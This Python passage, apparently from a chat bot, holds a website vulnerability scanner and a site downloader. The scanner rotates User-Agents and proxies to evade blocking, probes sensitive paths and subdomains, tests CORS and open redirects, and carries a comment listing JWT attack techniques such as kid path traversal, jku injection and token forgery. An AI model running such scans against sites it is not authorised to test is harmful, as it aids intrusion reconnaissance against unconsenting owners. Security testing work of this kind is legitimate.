    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
    # ── Firefox — macOS ──────────────────────────────────────────────
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:138.0) Gecko/20100101 Firefox/138.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:136.0) Gecko/20100101 Firefox/136.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 13.6; rv:128.0) Gecko/20100101 Firefox/128.0',
    # ── Firefox — Linux ──────────────────────────────────────────────
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0',
    'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0',
    'Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0',
    # ── Safari — macOS ───────────────────────────────────────────────
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
    # ── Edge — Windows ───────────────────────────────────────────────
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
    # ── Mobile — Android Chrome ──────────────────────────────────────
    'Mozilla/5.0 (Linux; Android 15; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.60 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.85 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.6998.135 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6943.137 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; Pixel 7a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.107 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.60 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.85 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.107 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; OnePlus 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6834.79 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; RMX3890) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.200 Mobile Safari/537.36',
    # ── Mobile — iOS Safari ──────────────────────────────────────────
    'Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    # ── iPad ─────────────────────────────────────────────────────────
    'Mozilla/5.0 (iPad; CPU OS 18_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1',
    # ── Opera ─────────────────────────────────────────────────────────
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0',
    # ── Brave (Chrome-based) ──────────────────────────────────────────
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    # ── Mobile Firefox ───────────────────────────────────────────────
    'Mozilla/5.0 (Android 15; Mobile; rv:138.0) Gecko/138.0 Firefox/138.0',
    'Mozilla/5.0 (Android 14; Mobile; rv:136.0) Gecko/136.0 Firefox/136.0',
    'Mozilla/5.0 (Android 14; Mobile; rv:128.0) Gecko/128.0 Firefox/128.0',
    # ── Samsung Internet ─────────────────────────────────────────────
    'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/27.0 Chrome/125.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 Chrome/117.0.0.0 Mobile Safari/537.36',
]


def _get_headers() -> dict:
    """Rotate User-Agent each call with realistic browser headers."""
    ua = random.choice(_UA_LIST)
    is_mobile = 'Mobile' in ua or 'Android' in ua or 'iPhone' in ua or 'iPad' in ua
    return {
        'User-Agent': ua,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': random.choice([
            'en-US,en;q=0.9', 'en-GB,en;q=0.9', 'en-US,en;q=0.5',
            'en-US,en;q=0.9,fr;q=0.8', 'en-US,en;q=0.9,de;q=0.8',
        ]),
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Cache-Control': 'max-age=0',
        **({"Sec-CH-UA-Mobile": "?1"} if is_mobile else {"Sec-CH-UA-Mobile": "?0"}),
    }


def _get_page_fingerprint(url: str, timeout: int = 6) -> tuple:
    """
    Get (status_code, body_hash, content_length) for baseline comparison.
    Used to detect catch-all pages.
    """
    try:
        resp = requests.get(url, headers=_get_headers(), timeout=timeout,
                            stream=True, allow_redirects=True, verify=False,
                            proxies=proxy_manager.get_proxy())
        status = resp.status_code
        chunk  = b''
        for part in resp.iter_content(1024):
            chunk += part
            if len(chunk) >= 1024: break
        resp.close()
        body_hash = hashlib.md5(chunk[:512]).hexdigest()
        ct_length = int(resp.headers.get('Content-Length', len(chunk)))
        return status, body_hash, ct_length, resp.headers.get('Content-Type','')
    except Exception:
        return 0, '', 0, ''


def _detect_catchall(base_url: str) -> tuple:
    """
    Request a random non-existent path — if it returns 200,
    the server has a catch-all (Cloudflare, custom 404 as 200).
    Returns (is_catchall: bool, baseline_hash: str, baseline_len: int)
    """
    rand_path = '/' + ''.join(random.choices(string.ascii_lowercase, k=16)) + '.html'
    status, body_hash, ct_len, ct = _get_page_fingerprint(base_url.rstrip('/') + rand_path)
    if status == 200:
        return True, body_hash, ct_len   # catch-all confirmed
    return False, '', 0


def _is_fake_200_content(body: bytes, ct: str) -> bool:
    if 'html' not in ct.lower():
        return False
    snippet = body[:800].lower()
    return any(s in snippet for s in _FAKE_SIGS)


def _probe_one(
    base_url: str, path: str, label: str, severity: str,
    catchall: bool, baseline_hash: str, baseline_len: int,
    delay: float = 0.0
) -> dict | None:
    """
    Probe one path — GET + stream.
    Compares against baseline to filter catch-all false positives.
    """
    if delay > 0:
        time.sleep(delay)

    full_url = base_url.rstrip('/') + path
    try:
        resp = requests.get(
            full_url, headers=_get_headers(),
            timeout=8, stream=True,
            allow_redirects=True, verify=False,
            proxies=proxy_manager.get_proxy(),
        )
        status = resp.status_code
        ct     = resp.headers.get('Content-Type', '')

        if status == 200:
            chunk = b''
            for part in resp.iter_content(1024):
                chunk += part
                if len(chunk) >= 1024: break
            resp.close()

            # ── Catch-all filter ──────────────────
            if catchall:
                page_hash = hashlib.md5(chunk[:512]).hexdigest()
                page_len  = int(resp.headers.get('Content-Length', len(chunk)))
                # Same hash or very similar length = catch-all page
                if page_hash == baseline_hash:
                    return None
                if baseline_len > 0 and abs(page_len - baseline_len) < 50:
                    return None

            # ── Fake 200 (custom 404 HTML) ────────
            if _is_fake_200_content(chunk, ct):
                return None

            size = int(resp.headers.get('Content-Length', len(chunk)))
            return {
                "path": path, "full_url": full_url,
                "label": label, "severity": severity,
                "status": 200, "protected": False, "size": size,
            }

        elif status == 403 and severity in ("CRITICAL","HIGH"):
            resp.close()
            # Cloudflare 403 = file might exist but CF blocks it
            cf = 'cloudflare' in resp.headers.get('Server','').lower() or \
                 'cf-ray' in resp.headers
            note = " (CF-blocked)" if cf else ""
            return {
                "path": path, "full_url": full_url,
                "label": label + note, "severity": "MEDIUM",
                "status": 403, "protected": True, "size": 0,
            }

        elif status in (301,302,307,308):
            loc = resp.headers.get('Location','')
            resp.close()
            if severity in ("HIGH","MEDIUM","LOW") and any(
                k in loc for k in ('login','auth','signin','session')
            ):
                return {
                    "path": path, "full_url": full_url,
                    "label": label + " (→ login)",
                    "severity": severity, "status": status,
                    "protected": True, "size": 0,
                }

        else:
            try: resp.close()
            except: pass

    except requests.exceptions.Timeout:
        pass
    except Exception:
        pass
    return None


def _verify_subdomain_real(sub_url: str) -> bool:
    """
    A subdomain is 'real' only if:
    1. DNS resolves OK
    2. HTTP responds (any code)
    3. It has DIFFERENT content than a random path on SAME subdomain
       (i.e. not a Cloudflare/nginx catch-all that mirrors base domain)
    """
    try:
        hostname = urlparse(sub_url).hostname
        socket.gethostbyname(hostname)   # DNS must resolve
    except socket.gaierror:
        return False  # NXDOMAIN = not real

    # Check if it returns anything
    try:
        r = requests.get(sub_url, headers=_get_headers(), timeout=5,
                         proxies=proxy_manager.get_proxy(), allow_redirects=True, verify=False, stream=True)
        r.close()
        code = r.status_code
        if code >= 500:
            return False
    except Exception:
        return False

    # Verify it's NOT a catch-all mirror of the base domain
    is_catchall, _, _ = _detect_catchall(sub_url)
    # Even catch-all subdomains can be real services — just note it
    # We still include them but mark behavior
    return True


def _scan_target_sync(
    target_url: str, delay_per_req: float = 0.3
) -> tuple:
    """Scan one URL with catch-all detection and delays."""
    exposed   = []
    protected = []

    # Detect catch-all first
    catchall, baseline_hash, baseline_len = _detect_catchall(target_url)

    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as ex:
        fmap = {
            ex.submit(
                _probe_one, target_url, path, label, sev,
                catchall, baseline_hash, baseline_len,
                delay_per_req * (i % 5)   # stagger delays 0/0.3/0.6/0.9/1.2s
            ): (path, label, sev)
            for i, (path, label, sev) in enumerate(_VULN_PATHS)
        }
        for fut in concurrent.futures.as_completed(fmap, timeout=120):
            try:
                f = fut.result(timeout=15)
                if f:
                    (protected if f["protected"] else exposed).append(f)
            except Exception:
                pass

    exposed.sort(key=lambda x: _SEV_ORDER.get(x["severity"],9))
    protected.sort(key=lambda x: _SEV_ORDER.get(x["severity"],9))
    return exposed, protected, catchall


def _discover_subdomains_sync(base_url: str, progress_q: list) -> list:
    """
    Discover live subdomains — with real verification (not catch-all mirrors).
    """
    parsed = urlparse(base_url)
    scheme = parsed.scheme
    parts  = parsed.hostname.split('.')
    root   = '.'.join(parts[-2:]) if len(parts) > 2 else parsed.hostname

    progress_q.append(
        f"📡 Subdomain discovery...\n"
        f"Testing `{len(_COMMON_SUBDOMAINS)}` common names on `{root}`"
    )

    live = []

    def check_sub(sub):
        url = f"{scheme}://{sub}.{root}"
        if _verify_subdomain_real(url):
            return url
        return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
        futures = {ex.submit(check_sub, sub): sub for sub in _COMMON_SUBDOMAINS}
        for fut in concurrent.futures.as_completed(futures, timeout=40):
            try:
                result = fut.result(timeout=8)
                if result:
                    live.append(result)
            except Exception:
                pass

    return live


def _vuln_scan_sync(url: str, progress_q: list, skip_subs: bool = False) -> dict:
    """Improved orchestrator — parallel targets + CORS + open redirect."""
    is_cloudflare = False
    results = {
        "url": url, "findings": [],
        "missing_headers": [], "clickjacking": False,
        "https": url.startswith("https://"),
        "server": "Unknown", "subdomains_found": [],
        "total_scanned": 0, "errors": 0,
        "cloudflare": False,
        "cors": {}, "open_redirects": [],
    }

    # ── Baseline headers ──────────────────────────
    progress_q.append("🔍 Checking security headers + CORS...")
    try:
        r0 = requests.get(
            url, timeout=10, headers=_get_headers(),
            proxies=proxy_manager.get_proxy(),
            allow_redirects=True, verify=False
        )
        hdrs = dict(r0.headers)
        srv  = hdrs.get("Server", "Unknown")
        results["server"] = srv[:60]
        is_cloudflare = "cloudflare" in srv.lower() or "cf-ray" in hdrs
        results["cloudflare"] = is_cloudflare

        for hdr, (name, sev) in _SEC_HEADERS.items():
            if hdr not in hdrs:
                results["missing_headers"].append((name, hdr, sev))
        if srv and any(c.isdigit() for c in srv):
            results["missing_headers"].append(
                ("Server version leak", f"Server: {srv[:50]}", "LOW"))
        xpb = hdrs.get("X-Powered-By", "")
        if xpb:
            results["missing_headers"].append(
                ("Tech disclosure", f"X-Powered-By: {xpb[:40]}", "LOW"))
        has_xfo = "X-Frame-Options" in hdrs
        has_fa  = "frame-ancestors" in hdrs.get("Content-Security-Policy", "")
        results["clickjacking"] = not has_xfo and not has_fa
    except Exception:
        results["errors"] += 1

    # ── CORS check ────────────────────────────────
    cors_result = _check_cors_misconfig(url)
    results["cors"] = cors_result
    if cors_result["vulnerable"]:
        sev = cors_result["severity"]
        progress_q.append(
            f"🚨 CORS misconfiguration — `{sev}`\n"
            f"ACAO: `{cors_result['acao']}`\n"
            f"Credentials: `{cors_result.get('acac','false')}`"
        )

    # ── Open redirect ─────────────────────────────
    progress_q.append("🔀 Testing open redirect payloads...")
    results["open_redirects"] = _check_open_redirect(url)
    if results["open_redirects"]:
        progress_q.append(
            f"🟠 Open redirect found — `{len(results['open_redirects'])}` params vulnerable"
        )

    req_delay   = 0.8 if is_cloudflare else 0.2
    if is_cloudflare:
        progress_q.append("☁️ *Cloudflare detected* — slower scan mode...")

    # ── Subdomain discovery ───────────────────────
    if not skip_subs:
        live_subs = _discover_subdomains_sync(url, progress_q)
        results["subdomains_found"] = live_subs
        if live_subs:
            progress_q.append(
                f"✅ *{len(live_subs)} subdomains found:*\n"
                + "\n".join(f"  • `{urlparse(s).netloc}`" for s in live_subs[:8])
            )
        else:
            progress_q.append("📭 No live subdomains found")
    else:
        progress_q.append("⏭️ Subdomain scan skipped")

    # ── Parallel target scan ──────────────────────
    all_targets = [url] + results["subdomains_found"]
    progress_q.append(
        f"🔍 Scanning `{len(all_targets)}` target(s) in parallel..."
    )

    def _scan_one(target):
        exposed, protected, catchall = _scan_target_sync(target, req_delay)
        return {
            "target":    target,
            "netloc":    urlparse(target).netloc,
            "exposed":   exposed,
            "protected": protected,
            "catchall":  catchall,
        }

    with concurrent.futures.ThreadPoolExecutor(max_workers=min(len(all_targets), 6)) as ex:
        futures = {ex.submit(_scan_one, t): t for t in all_targets}
        for fut in concurrent.futures.as_completed(futures, timeout=180):
            try:
                r = fut.result(timeout=30)
                results["total_scanned"] += len(_VULN_PATHS)
                if r["exposed"] or r["protected"]:
                    results["findings"].append(r)
                netloc = r["netloc"]
                exp_cnt = len(r["exposed"])
                if exp_cnt:
                    progress_q.append(f"🚨 `{netloc}` — `{exp_cnt}` exposed paths found")
            except Exception:
                results["errors"] += 1

    return results


# ── Also patch _format_vuln_report to show CORS + redirect ──────────
def _format_vuln_report(r: dict) -> str:
    domain = urlparse(r["url"]).netloc
    lines  = []

    total_exp = sum(len(f["exposed"]) for f in r["findings"])
    all_sevs  = [fi["severity"] for f in r["findings"] for fi in f["exposed"]]

    cors_vuln = r.get("cors", {}).get("vulnerable", False)
    cors_sev  = r.get("cors", {}).get("severity", "")
    redirects = r.get("open_redirects", [])

    if "CRITICAL" in all_sevs or cors_sev == "CRITICAL": overall = "🔴 CRITICAL RISK"
    elif "HIGH" in all_sevs or redirects or cors_sev == "HIGH": overall = "🟠 HIGH RISK"
    elif "MEDIUM" in all_sevs or r["clickjacking"]: overall = "🟡 MEDIUM RISK"
    elif r["missing_headers"]: overall = "🔵 LOW RISK"
    else: overall = "✅ CLEAN"

    cf_badge = " ☁️ Cloudflare" if r.get("cloudflare") else ""
    lines += [
        "🛡️ *Vulnerability Scan Report*",
        f"🌐 `{domain}`{cf_badge}",
        f"📊 Risk: *{overall}*",
        f"🔍 Paths: `{r['total_scanned']}` | Issues: `{total_exp}`",
        f"📡 Subdomains: `{len(r['subdomains_found'])}`",
        f"🖥️ Server: `{r['server']}`",
        "",
    ]

    # CORS result
    lines.append("*🌐 CORS Policy:*")
    if cors_vuln:
        sev = r["cors"]["severity"]
        em  = "🔴" if sev == "CRITICAL" else "🟠"
        lines.append(f"  {em} `{sev}` — {r['cors']['note']}")
        lines.append(f"  ACAO: `{r['cors']['acao']}`")
    else:
        lines.append("  ✅ No origin reflection")
    lines.append("")

    # Open redirect
    if redirects:
        lines.append(f"*🔀 Open Redirect:* `{len(redirects)}` params vulnerable")
        for rd in redirects[:3]:
            lines.append(f"  🟠 `?{rd['param']}=` → `{rd['location'][:60]}`")
        lines.append("")

    # Subdomains
    if r["subdomains_found"]:
        lines.append("*📡 Live Subdomains:*")
        for s in r["subdomains_found"]:
            lines.append(f"  • {s}")
        lines.append("")

    lines.append("*🔐 HTTPS:*")
    lines.append("  ✅ HTTPS enabled" if r["https"] else "  🔴 HTTP only — no encryption!")
    lines.append("")

    if r["findings"]:
        for f in r["findings"]:
            if f["exposed"]:
                lines.append(f"*🚨 Exposed — `{f['netloc']}`:*")
                for fi in f["exposed"]:
                    em   = _SEV_EMOJI.get(fi["severity"], "⚪")
                    lines.append(f"  {em} `{fi['severity']}` — {fi['label']} `[{fi['status']}]`")
                    lines.append(f"  🔗 {fi['full_url']}")
                lines.append("")
            if f["protected"]:
                lines.append(f"*⚠️ Gated (401/403) — `{f['netloc']}`:*")
                for fi in f["protected"][:5]:
                    em = _SEV_EMOJI.get(fi["severity"], "⚪")
                    lines.append(f"  {em} {fi['label']}")
                    lines.append(f"  🔗 {fi['full_url']}")
                lines.append("")
    else:
        lines += ["*✅ No exposed files found*", ""]

    lines.append("*🖼️ Clickjacking:*")
    if r["clickjacking"]:
        lines.append("  🟠 Vulnerable — no X-Frame-Options / frame-ancestors")
    else:
        lines.append("  ✅ Protected")
    lines.append("")

    if r["missing_headers"]:
        lines.append("*📋 Security Header Issues:*")
        for name, hdr, sev in r["missing_headers"][:8]:
            em = _SEV_EMOJI.get(sev, "⚪")
            if "leak" in name.lower() or "disclosure" in name.lower():
                lines.append(f"  {em} {name}: `{hdr}`")
            else:
                lines.append(f"  {em} Missing *{name}*")
        lines.append("")

    lines += [
        "━━━━━━━━━━━━━━━━━━",
        "⚠️ _Passive scan only — no exploitation_",
    ]
    return "\n".join(lines)


# ───────────────────────────────────────────────────────────────────
# [2] REPLACE JWT functions (original: lines ~5482–5600)
#     IMPROVEMENTS:
#       + kid path traversal injection (/etc/passwd, SQLi)
#       + JWKS endpoint spoof detection + jku/x5u injection
#       + exp=9999999999 timestamp forgery
#       + Parallel brute-force (ThreadPoolExecutor)
#       + All-in-one combined attack report
# ───────────────────────────────────────────────────────────────────

def download_website(
    base_url: str,
    full_site: bool,
    use_js: bool,
    max_pages: int,
    max_assets: int,
    progress_cb=None,
    resume: bool = False,
) -> tuple:

    domain     = urlparse(base_url).netloc
    safe       = re.sub(r'[^\w\-]','_', domain)
    domain_dir = os.path.join(DOWNLOAD_DIR, safe)
    os.makedirs(domain_dir, exist_ok=True)

    state       = load_resume(base_url) if resume else {"visited":[],"downloaded":[],"assets":[],"stats":{}}
    visited     = set(state["visited"])
    dl_done     = set(state["downloaded"])
    known_assets= set(state["assets"])
    stats = state.get("stats") or {'pages':0,'assets':0,'failed':0,'size_kb':0}

    session = requests.Session()
    session.headers.update(_get_headers())

    # ── Attach proxy to session if available ──────
    _px = proxy_manager.get_proxy()
    if _px:
        session.proxies.update(_px)

    # ── Phase 0: Sitemap discovery ───────────────
    queue: list = [base_url]   # ← FIX: initialize before sitemap section
    if full_site and not resume:
        if progress_cb: progress_cb("🗺️ Sitemap ရှာနေပါတယ်...")
        sitemap_urls = fetch_sitemap(base_url)
        if sitemap_urls:
            stats['sitemap_urls'] = len(sitemap_urls)
            if progress_cb:
                progress_cb("🗺️ Sitemap: `%d` URLs တွေ့ပြီ" % len(sitemap_urls))
            for u in list(sitemap_urls)[:max_pages]:
                if u not in visited and u not in queue:
                    queue.append(u)

    # ── Phase 1: Pages ──────────────────────────
    queue = list(dict.fromkeys(queue))
    queue = [u for u in queue if u not in visited]

    while queue and len(visited) < max_pages:
        url = queue.pop(0)
        if url in visited: continue

        # SSRF check per link
        safe_ok, reason = is_safe_url(url)
        if not safe_ok:
            log_warn(url, f"SSRF blocked: {reason}")
            stats['failed'] += 1
            visited.add(url)
            continue

        visited.add(url)
        html, js_used = fetch_page(url, use_js)
        if html is None:
            stats['failed'] += 1
            continue

        local = safe_local_path(domain_dir, url)
        try:
            with open(local,'w',encoding='utf-8',errors='replace') as f:
                f.write(html)
            stats['pages'] += 1
        except Exception:
            stats['failed'] += 1
            continue

        known_assets |= extract_assets(html, url)
        if full_site:
            for link in get_internal_links(html, url):
                if link not in visited:
                    queue.append(link)

        if stats['pages'] % 5 == 0:
            save_resume(base_url, {"visited":list(visited),"downloaded":list(dl_done),
                                   "assets":list(known_assets),"stats":stats})
        if progress_cb:
            bar = pbar(stats['pages'], max(len(visited), 1))
            progress_cb(
                f"📄 *Pages*\n`{bar}`\n"
                f"`{stats['pages']}` pages | `{len(known_assets)}` assets"
                + (" ⚡JS" if js_used else "")
            )

    # ── Phase 2: Assets ─────────────────────────
    asset_list   = [a for a in list(known_assets)[:max_assets] if a not in dl_done]
    total_assets = len(asset_list) + len(dl_done)
    extra_css    = set()
    max_bytes    = MAX_ASSET_MB * 1024 * 1024

    for i, asset_url in enumerate(asset_list):
        dl_done.add(asset_url)

        # SSRF check per asset
        safe_ok, reason = is_safe_url(asset_url)
        if not safe_ok:
            log_warn(asset_url, f"Asset SSRF blocked: {reason}")
            stats['failed'] += 1
            continue

        try:
            resp = session.get(asset_url, timeout=TIMEOUT, stream=True)
            resp.raise_for_status()

            # ── File size limit (DoS prevention) ──
            cl = resp.headers.get('Content-Length')
            if cl and int(cl) > max_bytes:
                log_warn(asset_url, f"Asset too large: {int(cl)//1024//1024}MB — skipped")
                stats['failed'] += 1
                continue

            content      = b''
            size_exceeded = False
            for chunk in resp.iter_content(8192):
                content += chunk
                if len(content) > max_bytes:
                    size_exceeded = True
                    break
            if size_exceeded:
                log_warn(asset_url, "Asset size limit exceeded mid-stream — skipped")
                stats['failed'] += 1
                continue

            local = safe_local_path(domain_dir, asset_url)
            with open(local,'wb') as f: f.write(content)
            stats['assets'] += 1
            stats['size_kb'] += len(content)/1024

            ct = resp.headers.get('Content-Type','')
            if 'css' in ct or asset_url.lower().endswith('.css'):
                extra_css |= extract_css_assets(content.decode('utf-8','replace'), asset_url)
            # ── Mine JS bundles for media URLs ────
            if 'javascript' in ct or asset_url.lower().endswith('.js'):
                js_media = extract_media_from_js(content.decode('utf-8','replace'), base_url)
                known_assets |= js_media

        except Exception as e:
            stats['failed'] += 1

        if i % 30 == 0:
            save_resume(base_url, {"visited":list(visited),"downloaded":list(dl_done),
                                   "assets":list(known_assets),"stats":stats})
        if progress_cb and i % 10 == 0:
            bar = pbar(len(dl_done), total_assets)
            progress_cb(
                f"📦 *Assets*\n`{bar}`\n"
                f"`{stats['assets']}` done | `{stats['size_kb']/1024:.1f}` MB"
            )

    # ── Phase 3: CSS nested assets ──────────────
    for asset_url in list(extra_css - dl_done)[:200]:
        safe_ok, _ = is_safe_url(asset_url)
        if not safe_ok: continue
        try:
            resp    = session.get(asset_url, timeout=TIMEOUT, stream=True)
            resp.raise_for_status()
            content = b''.join(resp.iter_content(8192))
            if len(content) > max_bytes: continue
            local   = safe_local_path(domain_dir, asset_url)
            with open(local,'wb') as f: f.write(content)
            stats['assets']  += 1
            stats['size_kb'] += len(content)/1024
        except Exception:
            stats['failed'] += 1

    # ── Phase 4: ZIP ─────────────────────────────
    if progress_cb: progress_cb("🗜️ ZIP ထုပ်နေပါတယ်...")

    zip_path = os.path.join(DOWNLOAD_DIR, f"{safe}.zip")
    with zipfile.ZipFile(zip_path,'w',zipfile.ZIP_DEFLATED) as zf:
        for root,dirs,files in os.walk(domain_dir):
            for file in files:
                fp = os.path.join(root,file)
                zf.write(fp, os.path.relpath(fp, DOWNLOAD_DIR))

    shutil.rmtree(domain_dir, ignore_errors=True)
    clear_resume(base_url)

    size_mb = os.path.getsize(zip_path)/1024/1024

    if needs_split(zip_path):
        if progress_cb: progress_cb(f"✂️ {size_mb:.1f}MB split လုပ်နေပါတယ်...")
        parts = split_zip(zip_path)
        os.remove(zip_path)
        return parts, None, stats, size_mb
    return [zip_path], None, stats, size_mb


# ══════════════════════════════════════════════════
# 🔬  FEATURE 1 — /tech  Tech Stack Fingerprinter
# ══════════════════════════════════════════════════

_TECH_SIGNATURES = {
    # CMS
    "WordPress":        [r'wp-content/', r'wp-includes/', r'wordpress'],
    "Drupal":           [r'Drupal\.settings', r'/sites/default/files/'],
    "Joomla":           [r'/media/joomla_', r'Joomla!'],
    "Ghost CMS":        [r'ghost\.io', r'/ghost/api/'],
    "Shopify":          [r'cdn\.shopify\.com', r'Shopify\.theme'],
    # JS Frameworks
    "Next.js":          [r'__NEXT_DATA__', r'/_next/static/'],
    "Nuxt.js":          [r'__NUXT__', r'/_nuxt/'],
    "React":            [r'__reactFiber', r'react-dom\.production'],
    "Vue.js":           [r'__vue__', r'data-v-[a-f0-9]+'],
    "Angular":          [r'ng-version=', r'angular\.min\.js'],
    "Svelte":           [r'__svelte', r'svelte-'],
    # Servers
    "Nginx":            [r'server:\s*nginx'],
    "Apache":           [r'server:\s*apache'],
    "Caddy":            [r'server:\s*caddy'],
    "LiteSpeed":        [r'server:\s*litespeed'],
    "IIS":              [r'server:\s*microsoft-iis'],
    # CDN / WAF
